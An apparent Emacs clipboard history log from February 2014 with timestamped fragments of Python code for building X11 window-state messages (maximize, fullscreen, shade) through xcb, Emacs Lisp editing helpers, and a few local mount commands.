MaximizeStateData
* Tue 25 Feb 2014 12:43:36 AM JST
'_NET_WM_STATE_MAXIMIZED_VERT'
* Tue 25 Feb 2014 12:43:46 AM JST
MaximizeStateData
* Tue 25 Feb 2014 12:43:55 AM JST
'_NET_WM_STATE_MAXIMIZED_HORZ'
* Tue 25 Feb 2014 12:44:10 AM JST
_d2
* Tue 25 Feb 2014 12:44:43 AM JST
_d2
* Tue 25 Feb 2014 12:44:49 AM JST
_d3
* Tue 25 Feb 2014 12:45:04 AM JST
_d1
* Tue 25 Feb 2014 12:45:11 AM JST
_d2
* Tue 25 Feb 2014 12:45:15 AM JST
_d4
* Tue 25 Feb 2014 12:45:40 AM JST
_d2
* Tue 25 Feb 2014 12:45:47 AM JST
_d0
* Tue 25 Feb 2014 12:45:52 AM JST
_d1
* Tue 25 Feb 2014 12:45:57 AM JST
_d3
* Tue 25 Feb 2014 12:46:01 AM JST
_d4
* Tue 25 Feb 2014 12:46:16 AM JST
MaximizeStateData.data[1] = '_NET_WM_STATE_MAXIMIZED_VERT'
* Tue 25 Feb 2014 12:46:24 AM JST
'_NET_WM_STATE_FULLSCREEN'
* Tue 25 Feb 2014 12:46:26 AM JST

* Tue 25 Feb 2014 12:46:26 AM JST

* Tue 25 Feb 2014 12:46:27 AM JST
    _d1 = '_NET_WM_STATE_FULLSCREEN'

* Tue 25 Feb 2014 12:46:34 AM JST
FullscreenStateData
* Tue 25 Feb 2014 12:46:43 AM JST
ShadeStateData
* Tue 25 Feb 2014 12:46:56 AM JST
AboveStateData
* Tue 25 Feb 2014 12:47:16 AM JST
BelowStateData
* Tue 25 Feb 2014 12:52:09 AM JST

* Tue 25 Feb 2014 12:52:09 AM JST

* Tue 25 Feb 2014 12:52:09 AM JST
    # _d1 = '_NET_WM_STATE_MAXIMIZED_VERT'

* Tue 25 Feb 2014 12:52:09 AM JST
    # _d1 = '_NET_WM_STATE_MAXIMIZED_VERT'

* Tue 25 Feb 2014 12:52:09 AM JST
    # _d1 = '_NET_WM_STATE_MAXIMIZED_VERT'
    # _d2 = '_NET_WM_STATE_MAXIMIZED_HORZ'

* Tue 25 Feb 2014 12:52:12 AM JST
MaximizeStateData.data[1]
* Tue 25 Feb 2014 12:52:22 AM JST
MaximizeStateData[2]
* Tue 25 Feb 2014 12:52:35 AM JST
self, 
* Tue 25 Feb 2014 12:53:58 AM JST
self
* Tue 25 Feb 2014 12:56:01 AM JST
con = Connection.get_instance(display=self.display)
* Tue 25 Feb 2014 12:57:15 AM JST
con.core.atom.identify_atom(self.data[2])
* Tue 25 Feb 2014 12:57:24 AM JST
2]
* Tue 25 Feb 2014 12:57:24 AM JST
data[2]
* Tue 25 Feb 2014 12:57:31 AM JST
        
* Tue 25 Feb 2014 12:57:56 AM JST
.core.atom.identify_atom
* Tue 25 Feb 2014 12:58:04 AM JST
identify_atom
* Tue 25 Feb 2014 12:58:07 AM JST
con
* Tue 25 Feb 2014 12:58:10 AM JST
core.
* Tue 25 Feb 2014 12:58:11 AM JST
con.
* Tue 25 Feb 2014 12:58:13 AM JST
core.
* Tue 25 Feb 2014 12:58:13 AM JST
con.core.
* Tue 25 Feb 2014 12:59:36 AM JST
    def __init__(self, display=None):
        r"""SUMMARY
        
        __init__(display=None)
        
        @Arguments:
        - `display`:
        
        @Return:
        """
        StateDataMakerAbstract.__init__(self, display=display)
        atom = Connection.get_instance(display=self.display).core.atom
        self.data[2] = atom.identify_atom(self.statename1)
        self.data[3] = atom.identify_atom(self.statename2)

* Tue 25 Feb 2014 01:00:08 AM JST

* Tue 25 Feb 2014 01:00:08 AM JST

* Tue 25 Feb 2014 01:00:08 AM JST
        self.data[3] = atom.identify_atom(self.statename2)

* Tue 25 Feb 2014 01:02:25 AM JST
statename1
* Tue 25 Feb 2014 01:09:50 AM JST
fmt = 
* Tue 25 Feb 2014 01:15:14 AM JST
MaximizeStateData
* Tue 25 Feb 2014 10:28:51 AM JST
eventa
* Tue 25 Feb 2014 10:38:01 AM JST
get
* Tue 25 Feb 2014 10:38:04 AM JST
get
* Tue 25 Feb 2014 12:26:50 PM JST
'BBHII5I', 33, 32, 0, self.id,
                            handler._property, mode,
                            self.property1, self.property2, 0, 0)
* Tue 25 Feb 2014 12:26:58 PM JST
                            
* Tue 25 Feb 2014 12:26:59 PM JST
                            
* Tue 25 Feb 2014 12:27:05 PM JST
id
* Tue 25 Feb 2014 12:27:05 PM JST
self.id
* Tue 25 Feb 2014 12:28:09 PM JST

* Tue 25 Feb 2014 12:50:30 PM JST
self.
* Tue 25 Feb 2014 12:57:34 PM JST
PackResource
* Tue 25 Feb 2014 01:13:42 PM JST
abstractm
* Tue 25 Feb 2014 01:26:40 PM JST
self,
* Tue 25 Feb 2014 01:27:48 PM JST
self
* Tue 25 Feb 2014 02:19:29 PM JST
py:region-def-parameter
* Tue 25 Feb 2014 02:20:05 PM JST
(py:goto-def-parameter)
* Tue 25 Feb 2014 02:21:03 PM JST
py:region-def-parameter
* Tue 25 Feb 2014 02:21:53 PM JST
py:region-def-parameter
* Tue 25 Feb 2014 02:23:53 PM JST
(defun py:in--brackets (&optional left right contract)
  "Internal function that return non-nil if predicate in brackets.
If LEFT and RIGHT is nil, predicate any brackets.
LEFT: open paren like these (, [, {
RIGHT: close paren like these ), ], }
CONTRACT: If non-nil, contract to region internal paren."
  (let ((orig (point))
        (region (py:region-brackets left right contract)))
    (and region
         (< (car region) orig)
         (< orig (cdr region)))))
* Tue 25 Feb 2014 02:25:42 PM JST
           
* Tue 25 Feb 2014 02:25:43 PM JST
      
* Tue 25 Feb 2014 02:25:44 PM JST
    
* Tue 25 Feb 2014 02:25:45 PM JST
  
* Tue 25 Feb 2014 02:26:04 PM JST
py:in-parameter-p
* Tue 25 Feb 2014 02:26:17 PM JST
(py:in-parameter-p)
* Tue 25 Feb 2014 02:28:12 PM JST
COND
* Tue 25 Feb 2014 02:28:59 PM JST
smart-operator-*
* Tue 25 Feb 2014 02:30:17 PM JST
    
* Tue 25 Feb 2014 02:31:41 PM JST
("*"              'py-*)
* Tue 25 Feb 2014 02:32:36 PM JST
(define-key python-mode-map "*" 'py-*)
* Tue 25 Feb 2014 02:35:31 PM JST
smart-operator-mode-map
* Tue 25 Feb 2014 02:35:49 PM JST
(define-key smart-operator-mode-map "*" 'py-*)
* Tue 25 Feb 2014 03:01:51 PM JST
object
* Tue 25 Feb 2014 03:02:17 PM JST
from struct import pack

from cStringIO import StringIO


def packer(*args):
    r"""SUMMARY

    packer( * args)

    @Arguments:
    - `* args`:

    @Return:
    """
    buf = StringIO()
    for obj in args:
        buf.write(obj.pack())
    return buf.getvalue()


class PackResource(object):
    r"""
    """
    structfmt = ''

    def __new__(cls, *args, **kwargs):
        if not cls.structfmt:
            # TODO: (Atami) [2014/02/25]
            raise StandardError()
        return super(PackResource, cls).__new__(cls, *args, **kwargs)

    def __init__(self, data):
        r"""

        @Arguments:
        - `data`:
        """

        self._data = data

    def pack(self, ):
        r"""SUMMARY

        pack()

        @Return:
        """
        return pack(self.structfmt, self._data)


class Char(PackResource):
    r"""
    """
    structfmt = 'c'


class SignedChar(PackResource):
    r"""
    """
    structfmt = 'b'


class UnsignedChar(PackResource):
    r"""
    """
    structfmt = 'B'


class Short(PackResource):
    r"""
    """
    structfmt = 'h'

class UnsignedShort(PackResource):
    r"""
    """
    structfmt = 'H'


class Int(PackResource):
    r"""
    """
    structfmt = 'i'


class UnsignedInt(PackResource):
    r"""
    """
    structfmt = 'I'


class Long(PackResource):
    r"""
    """
    structfmt = 'l'


class UnsignedLong(PackResource):
    r"""
    """
    structfmt = 'L'


class LongLong(PackResource):
    r"""
    """
    structfmt = 'q'


class UnsignedLongLong(PackResource):
    r"""
    """
    structfmt = 'Q'


class Float(PackResource):
    r"""
    """
    structfmt = 'f'


class Double(PackResource):
    r"""
    """
    structfmt = 'd'


class Window(UnsignedInt):
    r"""
    """
    pass


class ClientType(UnsignedInt):
    r"""
    """

    pass


class SequenceNumber(UnsignedShort):
    r"""
    """
    pass


class Format(UnsignedChar):
    r"""
    """
    pass


class Code(UnsignedChar):
    r"""
    """
    pass


* Tue 25 Feb 2014 03:02:48 PM JST
from struct import pack

from cStringIO import StringIO

* Tue 25 Feb 2014 04:31:25 PM JST
Event.
* Tue 25 Feb 2014 04:31:52 PM JST
property
* Tue 25 Feb 2014 04:41:14 PM JST

* Tue 25 Feb 2014 04:41:14 PM JST

* Tue 25 Feb 2014 04:41:14 PM JST
    types = '_NET_WM_STATE'

* Tue 25 Feb 2014 04:42:40 PM JST
con
* Tue 25 Feb 2014 04:44:11 PM JST
self.types = request.
* Tue 25 Feb 2014 04:44:12 PM JST
request.
* Tue 25 Feb 2014 04:45:31 PM JST
atom
* Tue 25 Feb 2014 04:50:22 PM JST
from xahk.xconnection import Connection
* Tue 25 Feb 2014 04:50:28 PM JST
c=Connection()
* Tue 25 Feb 2014 04:50:34 PM JST
a=c.core.atom.identify_atom(5)
* Tue 25 Feb 2014 04:50:42 PM JST
from xahk.xconnection import Connection
c=Connection()
a=c.core.atom.identify_atom(5)
* Tue 25 Feb 2014 04:50:54 PM JST

* Tue 25 Feb 2014 04:50:54 PM JST

* Tue 25 Feb 2014 04:50:54 PM JST
        # return struct.pack('I', self._data)

* Tue 25 Feb 2014 04:56:02 PM JST
write()
* Tue 25 Feb 2014 04:59:10 PM JST
54616248
* Tue 25 Feb 2014 04:59:51 PM JST
pack()
* Tue 25 Feb 2014 05:08:14 PM JST
import
* Tue 25 Feb 2014 05:10:26 PM JST
window
* Tue 25 Feb 2014 05:10:56 PM JST

* Tue 25 Feb 2014 05:10:57 PM JST

* Tue 25 Feb 2014 05:10:57 PM JST
            print(obj)

* Tue 25 Feb 2014 05:15:11 PM JST

* Tue 25 Feb 2014 05:15:11 PM JST

* Tue 25 Feb 2014 05:15:11 PM JST
        """

* Tue 25 Feb 2014 05:15:53 PM JST
anything-c-moccur-buffer-list
* Tue 25 Feb 2014 05:23:30 PM JST
StateEvent
* Tue 25 Feb 2014 05:27:47 PM JST
Send
* Tue 25 Feb 2014 05:27:47 PM JST
core.Send
* Tue 25 Feb 2014 05:29:24 PM JST
data = MaximizeStateData(display=self.display).make_set_data()
* Tue 25 Feb 2014 05:29:38 PM JST

* Tue 25 Feb 2014 05:29:38 PM JST

* Tue 25 Feb 2014 05:29:38 PM JST
        event = StateEvent

* Tue 25 Feb 2014 05:29:42 PM JST
        event = StateEvent(self.window, self._format, self._seqnum, data)
        con = Connection.get_instance(display=self.display)
        con._xcb_connection.core.SendEvent(0, self.window, 0xffffff, event)

* Tue 25 Feb 2014 05:30:25 PM JST
54525998
* Tue 25 Feb 2014 05:34:55 PM JST
        event = StateEvent(self.window, self._format, self._seqnum, data).pack()
        con = Connection.get_instance(display=self.display)
        con._xcb_connection.core.SendEvent(0, self.window, 0xffffff, event)

* Tue 25 Feb 2014 05:36:12 PM JST
MaximizeStateData(display=self.display)
* Tue 25 Feb 2014 05:41:33 PM JST
self, 
* Tue 25 Feb 2014 05:42:06 PM JST
self
* Tue 25 Feb 2014 05:44:36 PM JST
(save-excursion
                                (py:goto-def-parameter)
                                  (py:join-param-list
                                  (delete "self" (py:list-parameter))))
* Tue 25 Feb 2014 05:47:43 PM JST
(car (s-split "," (py:list-parameter)))
* Tue 25 Feb 2014 05:48:11 PM JST
(py:list-parameter)
* Tue 25 Feb 2014 05:49:21 PM JST
(py:list-parameter)
* Tue 25 Feb 2014 05:50:40 PM JST
(py:join-param-list
   (delete "self" (py:list-parameter)))
* Tue 25 Feb 2014 05:51:34 PM JST
     
* Tue 25 Feb 2014 05:51:38 PM JST
(let ((param (py:list-parameter)))
  (if param
      (car param)
    ""))
* Tue 25 Feb 2014 05:52:02 PM JST
(let ((param (py:list-parameter)))
  (if param
      (car param)
    ""))
* Tue 25 Feb 2014 05:52:09 PM JST
  
* Tue 25 Feb 2014 05:52:13 PM JST
(save-excursion
  (py:goto-def-parameter)
  (let ((param (py:list-parameter)))
    (if param
        (car param)
      "")))
* Tue 25 Feb 2014 05:52:41 PM JST
  
* Tue 25 Feb 2014 05:55:01 PM JST
    def _send(self, data):
        r"""SUMMARY

        _send(data)

        @Arguments:
        - `data`:

        @Return:
        """
        event = StateEvent(self.window, self._format, self._seqnum, data).pack()
        con = Connection.get_instance(display=self.display)
        con._xcb_connection.core.SendEvent(0, self.window, 0xffffff, event)

* Tue 25 Feb 2014 05:57:00 PM JST
handler_class
* Tue 25 Feb 2014 05:57:00 PM JST
self.handler_class
* Tue 25 Feb 2014 05:57:46 PM JST
data_handler
* Tue 25 Feb 2014 05:57:47 PM JST
self.data_handler
* Tue 25 Feb 2014 06:01:25 PM JST
MaximizeStateData
* Tue 25 Feb 2014 06:01:43 PM JST
StateHandlerAbstract
* Tue 25 Feb 2014 06:02:55 PM JST
54525998
* Tue 25 Feb 2014 06:09:49 PM JST
FullscreenStateData
* Tue 25 Feb 2014 06:12:39 PM JST
StateData
* Tue 25 Feb 2014 06:12:53 PM JST
ShadeStateData
* Tue 25 Feb 2014 06:13:43 PM JST
AboveStateData
* Tue 25 Feb 2014 06:47:59 PM JST
    def __new__(cls, *args, **kwargs):
        if not hasattr(cls, 'statename2'):
            # TODO: (Atami) [2014/02/25]
            raise StandardError()
        return super(StateDataMaximize, cls).__new__(cls, *args, **kwargs)

    def __init__(self, display=None):
        r"""SUMMARY

        __init__(display=None)

        @Arguments:
        - `display`:

        @Return:
        """
        StateDataMakerAbstract.__init__(self, display=display)
        atom = Connection.get_instance(display=self.display).core.atom
        self.data[1] = atom.identify_atom(self.statename1)
        self.data[2] = atom.identify_atom(self.statename2)

* Tue 25 Feb 2014 06:48:33 PM JST
StateDataDouble
* Tue 25 Feb 2014 06:49:35 PM JST

* Tue 25 Feb 2014 06:49:41 PM JST

* Tue 25 Feb 2014 06:49:41 PM JST

* Tue 25 Feb 2014 06:49:42 PM JST
        self.data[2] = atom.identify_atom(self.statename2)

* Tue 25 Feb 2014 06:50:22 PM JST
    statename1 = '_NET_WM_STATE_MAXIMIZED_VERT'
    statename2 = '_NET_WM_STATE_MAXIMIZED_HORZ'

* Tue 25 Feb 2014 06:50:49 PM JST
class StateDataMakerBySingleAtom(StateDataMakerAbstract):
    r"""
    """

    def __init__(self, display=None):
        r"""SUMMARY

        __init__(display=None)

        @Arguments:
        - `display`:

        @Return:
        """
        StateDataMakerAbstract.__init__(self, display=display)
        atom = Connection.get_instance(display=self.display).core.atom
        self.data[1] = atom.identify_atom(getattr(self, 'statename1'))



* Tue 25 Feb 2014 06:53:13 PM JST
class StateDataMakerBySingleAtom(StateDataMakerAbstract):
    r"""
    """

    def __init__(self, display=None):
        r"""SUMMARY

        __init__(display=None)

        @Arguments:
        - `display`:

        @Return:
        """
        StateDataMakerAbstract.__init__(self, display=display)
        atom = Connection.get_instance(display=self.display).core.atom
        self.data[1] = atom.identify_atom(getattr(self, 'statename1'))


* Tue 25 Feb 2014 06:54:00 PM JST
StateDataMakerSingle
* Tue 25 Feb 2014 06:54:25 PM JST
StateDataMakerSingle
* Tue 25 Feb 2014 06:54:30 PM JST

* Tue 25 Feb 2014 06:54:31 PM JST

* Tue 25 Feb 2014 06:54:31 PM JST
        self.data[1] = atom.identify_atom(getattr(self, 'statename1'))

* Tue 25 Feb 2014 06:54:58 PM JST
class StateDataMaximize(StateDataDouble):
    r"""
    """
    statename1 = '_NET_WM_STATE_MAXIMIZED_VERT'
    statename2 = '_NET_WM_STATE_MAXIMIZED_HORZ'



* Tue 25 Feb 2014 06:58:26 PM JST
    def __init__(self, display=None):
        r"""SUMMARY

        __init__(display=None)

        @Arguments:
        - `display`:

        @Return:
        """
        StateDataMakerAbstract.__init__(self, display=display)
        atom = Connection.get_instance(display=self.display).core.atom
        self.data[1] = atom.identify_atom(getattr(self, 'statename1'))

* Tue 25 Feb 2014 06:58:44 PM JST
StateDataMakerAbstract
* Tue 25 Feb 2014 10:49:29 PM JST
StateDataBelow
* Tue 25 Feb 2014 10:50:07 PM JST
54525998
* Tue 25 Feb 2014 10:52:24 PM JST
StateDataBelow
* Tue 25 Feb 2014 10:54:06 PM JST
StateDataAbstract
* Tue 25 Feb 2014 10:55:01 PM JST
54525998
* Tue 25 Feb 2014 11:00:13 PM JST
class StateMaximizeData(StateDataDouble):
    r"""
    """
    statename1 = '_NET_WM_STATE_MAXIMIZED_VERT'
    statename2 = '_NET_WM_STATE_MAXIMIZED_HORZ'



* Tue 25 Feb 2014 11:01:10 PM JST

* Tue 25 Feb 2014 11:01:10 PM JST

* Tue 25 Feb 2014 11:01:10 PM JST
    # static

* Tue 25 Feb 2014 11:06:51 PM JST
class StateEvent(object):
    r"""
    """
    code = request.Code(33)

    def __init__(self, window, format_, seqnum, data, display=None):
        r"""SUMMARY

        __init__(window, format, seqnum, data)

        @Arguments:
        - `window`:
        - `format`:
        - `seqnum`:
        - `data`:

        @Return:
        """
        self.display = display or ''

        self.format = request.Format(format_)
        self.seqnum = request.SequenceNumber(seqnum)
        self.window = request.Window(window)
        atom = Connection.get_instance(display=self.display).core.atom
        self.types = atom.identify_atom('_NET_WM_STATE')
        self.data = data

    def pack(self, ):
        r"""SUMMARY

        pack()

        @Return:
        """
        buf = StringIO()
        for obj in (self.code, self.format, self.seqnum, self.window, self.types):
            buf.write(obj.pack())
        buf.write(self.data)
        return buf.getvalue()



* Tue 25 Feb 2014 11:19:25 PM JST
MaximizeHandle
* Tue 25 Feb 2014 11:19:33 PM JST
StateHan
* Tue 25 Feb 2014 11:19:46 PM JST
54525998
* Tue 25 Feb 2014 11:24:05 PM JST
'\x01\x00\x00\x00-\x01\x00\x00.\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
* Tue 25 Feb 2014 11:25:22 PM JST
'\x01\x00\x00\x00-\x01\x00\x00.\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
* Tue 25 Feb 2014 11:26:51 PM JST
from xahk import event

In [4]: m=event.MaximizeHandler(54525998)
* Tue 25 Feb 2014 11:26:59 PM JST
In [4]: 
* Tue 25 Feb 2014 11:27:17 PM JST
from xahk import event
m=event.MaximizeHandler(54525998)

* Tue 25 Feb 2014 11:28:25 PM JST
__iter__()
* Tue 25 Feb 2014 11:34:58 PM JST
iter
* Tue 25 Feb 2014 11:35:01 PM JST
list(self.pack())
* Tue 25 Feb 2014 11:36:40 PM JST

* Tue 25 Feb 2014 11:36:40 PM JST

* Tue 25 Feb 2014 11:36:40 PM JST
        try:

* Tue 25 Feb 2014 11:36:41 PM JST

* Tue 25 Feb 2014 11:36:41 PM JST

* Tue 25 Feb 2014 11:36:41 PM JST
        except 

* Tue 25 Feb 2014 11:38:06 PM JST
m=event.MaximizeHandler(54525998)
* Tue 25 Feb 2014 11:47:57 PM JST
m=event.MaximizeHandler(54525998)
* Tue 25 Feb 2014 11:51:48 PM JST
object
* Tue 25 Feb 2014 11:52:25 PM JST

* Tue 25 Feb 2014 11:52:25 PM JST

* Tue 25 Feb 2014 11:52:25 PM JST
        self.__packed = None

* Tue 25 Feb 2014 11:56:32 PM JST

* Tue 25 Feb 2014 11:56:32 PM JST

* Tue 25 Feb 2014 11:56:32 PM JST
        # self = buf.getvalue()

* Tue 25 Feb 2014 11:56:36 PM JST
str
* Tue 25 Feb 2014 11:59:57 PM JST
collections.Sequence
* Wed 26 Feb 2014 12:10:24 AM JST
import 
* Wed 26 Feb 2014 12:14:52 AM JST
TypeError: an integer is required
* Wed 26 Feb 2014 12:16:43 AM JST
'\\x01\\x00
* Wed 26 Feb 2014 12:16:47 AM JST
'\\x01\\x00'
* Wed 26 Feb 2014 12:27:41 AM JST
StateEvent
* Wed 26 Feb 2014 12:28:03 AM JST
54525998
* Wed 26 Feb 2014 12:33:01 AM JST
['!'
* Wed 26 Feb 2014 12:40:21 AM JST
index
* Wed 26 Feb 2014 12:42:27 AM JST
basestring
* Wed 26 Feb 2014 12:42:53 AM JST

* Wed 26 Feb 2014 12:42:53 AM JST

* Wed 26 Feb 2014 12:42:53 AM JST
        basestring.__init__(self)

* Wed 26 Feb 2014 12:43:00 AM JST
self.pack()
* Wed 26 Feb 2014 12:45:23 AM JST
basestring
* Wed 26 Feb 2014 12:45:31 AM JST
basestring
* Wed 26 Feb 2014 12:46:25 AM JST
e=event.StateEvent(54525998, 32, 0, '\x01')
* Wed 26 Feb 2014 12:46:27 AM JST
from xahk import event

In [135]: e=event.StateEvent(54525998, 32, 0, '\x01')
* Wed 26 Feb 2014 12:46:33 AM JST
In [135]: 
* Wed 26 Feb 2014 12:46:55 AM JST
from array import array
from xahk import event
e=event.StateEvent(54525998, 32, 0, '\x01')

* Wed 26 Feb 2014 12:47:10 AM JST
str
* Wed 26 Feb 2014 12:47:12 AM JST
str
* Wed 26 Feb 2014 12:47:25 AM JST
str
* Wed 26 Feb 2014 12:52:28 AM JST
basestring
* Wed 26 Feb 2014 12:59:38 AM JST
 
* Wed 26 Feb 2014 01:01:34 AM JST
self, 
* Wed 26 Feb 2014 01:03:44 AM JST
        self.display = display or ''

        self.format = request.Format(format_)
        self.seqnum = request.SequenceNumber(seqnum)
        self.window = request.Window(window)
        atom = Connection.get_instance(display=self.display).core.atom

* Wed 26 Feb 2014 01:03:50 AM JST
self
* Wed 26 Feb 2014 01:04:08 AM JST
self
* Wed 26 Feb 2014 01:04:18 AM JST
        self.types = atom.identify_atom('_NET_WM_STATE')
        self.data = data

* Wed 26 Feb 2014 01:04:24 AM JST
self
* Wed 26 Feb 2014 01:04:27 AM JST
self
* Wed 26 Feb 2014 01:05:12 AM JST
        buf = StringIO()
        for obj in (self.code, self.format, self.seqnum, self.window, self.types):
            buf.write(obj.pack())
        buf.write(self.data)

* Wed 26 Feb 2014 01:05:19 AM JST
self
* Wed 26 Feb 2014 01:05:22 AM JST
self
* Wed 26 Feb 2014 01:05:25 AM JST
self
* Wed 26 Feb 2014 01:05:28 AM JST
self
* Wed 26 Feb 2014 01:05:30 AM JST
self
* Wed 26 Feb 2014 01:05:34 AM JST
self
* Wed 26 Feb 2014 01:07:13 AM JST
e=event.StateEvent(54525998, 32, 0, '\x01')
* Wed 26 Feb 2014 01:08:04 AM JST
obj
* Wed 26 Feb 2014 01:11:23 AM JST
54525998
* Wed 26 Feb 2014 01:18:00 AM JST
MaximizeHandler
* Wed 26 Feb 2014 01:18:07 AM JST
54525998
* Wed 26 Feb 2014 01:31:19 AM JST
StateHandlerAbstract
* Wed 26 Feb 2014 01:32:16 AM JST
MaximizeHandler
* Wed 26 Feb 2014 01:32:37 AM JST
Handler
* Wed 26 Feb 2014 01:32:57 AM JST
Handler
* Wed 26 Feb 2014 01:33:13 AM JST
Handler
* Wed 26 Feb 2014 01:34:35 AM JST
Handler
* Wed 26 Feb 2014 01:36:53 AM JST

* Wed 26 Feb 2014 01:36:53 AM JST

* Wed 26 Feb 2014 01:36:53 AM JST
from UserString import UserString

* Wed 26 Feb 2014 01:36:56 AM JST

* Wed 26 Feb 2014 01:36:56 AM JST

* Wed 26 Feb 2014 01:36:56 AM JST
import collections

* Wed 26 Feb 2014 01:37:38 AM JST
obj.
* Wed 26 Feb 2014 01:37:39 AM JST
obj.
* Wed 26 Feb 2014 01:37:43 AM JST
obj.
* Wed 26 Feb 2014 01:37:44 AM JST
obj.
* Wed 26 Feb 2014 01:37:54 AM JST
obj.
* Wed 26 Feb 2014 01:37:55 AM JST
obj.
* Wed 26 Feb 2014 01:37:59 AM JST
obj.
* Wed 26 Feb 2014 01:38:16 AM JST
obj.
* Wed 26 Feb 2014 01:38:19 AM JST
obj.
* Wed 26 Feb 2014 01:38:21 AM JST
obj.
* Wed 26 Feb 2014 01:38:23 AM JST
obj.
* Wed 26 Feb 2014 01:38:31 AM JST

* Wed 26 Feb 2014 01:38:32 AM JST

* Wed 26 Feb 2014 01:38:32 AM JST
        data = data

* Wed 26 Feb 2014 01:38:34 AM JST
obj.
* Wed 26 Feb 2014 03:21:03 AM JST
window=window, format_=format_,
                                      seqnum=seqnum, display=self.display
* Wed 26 Feb 2014 03:21:27 AM JST
window=window, format_=format_,
                                          seqnum=seqnum, display=self.display
* Wed 26 Feb 2014 03:21:31 AM JST
        
* Wed 26 Feb 2014 03:21:53 AM JST
window=window, format_=format_,
                                seqnum=seqnum, display=self.display
* Wed 26 Feb 2014 03:22:10 AM JST
window=window, format_=format_,
                                seqnum=seqnum, display=self.display
* Wed 26 Feb 2014 03:22:18 AM JST
StateHandler
* Wed 26 Feb 2014 03:22:33 AM JST
54525998
* Wed 26 Feb 2014 03:23:08 AM JST
from xahk import event
* Wed 26 Feb 2014 03:23:22 AM JST
54525998
* Wed 26 Feb 2014 03:25:12 AM JST
54525998
* Wed 26 Feb 2014 03:26:35 AM JST

* Wed 26 Feb 2014 03:26:35 AM JST

* Wed 26 Feb 2014 03:26:35 AM JST
    data = ListFill(length=5, fill=0)

* Wed 26 Feb 2014 03:31:07 AM JST

* Wed 26 Feb 2014 03:31:07 AM JST

* Wed 26 Feb 2014 03:31:07 AM JST
        self.window = window

* Wed 26 Feb 2014 03:31:07 AM JST
        self.window = window

* Wed 26 Feb 2014 03:31:07 AM JST
        self.window = window
        self.display = display or ''

* Wed 26 Feb 2014 03:31:14 AM JST
self.
* Wed 26 Feb 2014 03:31:16 AM JST
self.
* Wed 26 Feb 2014 03:31:18 AM JST
self.
* Wed 26 Feb 2014 03:31:20 AM JST
self.
* Wed 26 Feb 2014 03:31:22 AM JST
self.
* Wed 26 Feb 2014 03:38:24 AM JST
54525998
* Wed 26 Feb 2014 03:40:41 AM JST
stringbase
* Wed 26 Feb 2014 03:42:42 AM JST
class STR(basestring):
    r"""
    """
    pass

* Wed 26 Feb 2014 10:40:07 AM JST
mount /dev/sda5 /media/Data
52578  mount /dev/sda7 /media/portable/
52579  mount /dev/mapper/data /data
* Wed 26 Feb 2014 10:40:10 AM JST
52578  
* Wed 26 Feb 2014 10:40:12 AM JST
52579  
* Wed 26 Feb 2014 12:27:45 PM JST

* Wed 26 Feb 2014 12:27:45 PM JST

* Wed 26 Feb 2014 12:27:45 PM JST
  (message "DEBUG-1-python_mode_start.el")

* Wed 26 Feb 2014 12:28:21 PM JST
(define-key smart-operator-mode-map "*" 'py-*)
* Wed 26 Feb 2014 12:31:11 PM JST

* Wed 26 Feb 2014 12:41:24 PM JST
54526006
* Wed 26 Feb 2014 01:10:38 PM JST
atom
* Wed 26 Feb 2014 01:10:55 PM JST
con
* Wed 26 Feb 2014 01:11:01 PM JST
property
* Wed 26 Feb 2014 01:11:01 PM JST
core.property
* Wed 26 Feb 2014 01:11:02 PM JST
con.core.property
* Wed 26 Feb 2014 01:11:12 PM JST
return
* Wed 26 Feb 2014 01:15:57 PM JST
prop
* Wed 26 Feb 2014 01:16:02 PM JST
property
* Wed 26 Feb 2014 01:16:47 PM JST
rep.get_full_value()
* Wed 26 Feb 2014 01:18:53 PM JST
'_NET_WM_STATE'
* Wed 26 Feb 2014 01:19:07 PM JST
'ATOM'
* Wed 26 Feb 2014 01:19:16 PM JST

* Wed 26 Feb 2014 01:19:16 PM JST

* Wed 26 Feb 2014 01:19:16 PM JST
    atom = '_NET_WM_STATE'

* Wed 26 Feb 2014 01:19:16 PM JST
    atom = '_NET_WM_STATE'

* Wed 26 Feb 2014 01:19:16 PM JST
    atom = '_NET_WM_STATE'
    types = 'ATOM'

* Wed 26 Feb 2014 01:19:51 PM JST

* Wed 26 Feb 2014 01:19:51 PM JST

* Wed 26 Feb 2014 01:19:51 PM JST
class Ish

* Wed 26 Feb 2014 01:19:56 PM JST
Get
* Wed 26 Feb 2014 01:21:11 PM JST
core = Connection.get_instance(display=self.display).core
* Wed 26 Feb 2014 01:21:17 PM JST
core
* Wed 26 Feb 2014 01:21:46 PM JST
'_NET_WM_STATE_MAXIMIZED_VERT'
* Wed 26 Feb 2014 01:22:31 PM JST
atom.identify_atom('_NET_WM_STATE_MAXIMIZED_VERT')
* Wed 26 Feb 2014 01:25:24 PM JST
atom = Connection.get_instance(display=self.display).core.atom
* Wed 26 Feb 2014 01:25:51 PM JST
'_NET_WM_STATE_FULLSCREEN'
* Wed 26 Feb 2014 01:26:41 PM JST
atom = Connection.get_instance(display=self.display).core.atom
* Wed 26 Feb 2014 01:27:07 PM JST
'_NET_WM_STATE_SHADED'
* Wed 26 Feb 2014 02:04:27 PM JST
atom = Connection.get_instance(display=self.display).core.atom
* Wed 26 Feb 2014 02:04:35 PM JST
'_NET_WM_STATE_ABOVE'
* Wed 26 Feb 2014 02:04:53 PM JST
above = atom.identify_atom('
* Wed 26 Feb 2014 02:04:58 PM JST
'_NET_WM_STATE_ABOVE'
* Wed 26 Feb 2014 02:05:16 PM JST
'_NET_WM_STATE_BELOW'
* Wed 26 Feb 2014 02:08:10 PM JST
54526006
* Wed 26 Feb 2014 02:08:31 PM JST
isbelow()
* Wed 26 Feb 2014 02:10:53 PM JST
54526006
* Wed 26 Feb 2014 02:11:34 PM JST
imp
* Wed 26 Feb 2014 02:32:24 PM JST
ConfigureWindow
* Wed 26 Feb 2014 05:36:39 PM JST
54526006
* Wed 26 Feb 2014 05:37:36 PM JST
mask |= 
* Wed 26 Feb 2014 05:37:56 PM JST
Width
* Wed 26 Feb 2014 06:43:15 PM JST
from xahk.xconnection.singleton import SingleConnection
* Wed 26 Feb 2014 06:47:33 PM JST
values
* Wed 26 Feb 2014 06:51:51 PM JST
con = SingleConnection.get_instance(display=self.display)
* Wed 26 Feb 2014 06:52:28 PM JST
xproto.InputFocus.PointerRoot,
* Wed 26 Feb 2014 06:55:23 PM JST
54526006
* Wed 26 Feb 2014 06:58:15 PM JST
configure
* Wed 26 Feb 2014 06:58:21 PM JST
self
* Wed 26 Feb 2014 10:58:12 PM JST
